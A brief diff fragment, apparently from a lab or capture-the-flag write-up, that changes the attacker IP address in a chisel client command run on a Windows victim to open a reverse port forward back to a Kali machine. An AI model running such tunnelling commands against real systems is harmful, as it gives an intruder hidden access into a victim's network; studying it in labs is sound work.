@@ -574,7 +574,7 @@ Be sure to copy chisel over via SMB to establish the port forward.
 Client (On Windows Victim):
 
 ```
-.\chisel.exe client 10.10.14.38:9999 R:8000:127.0.0.1:8000
+.\chisel.exe client 10.10.14.48:9999 R:8000:127.0.0.1:8000
 ```
 
 Server (Kali):
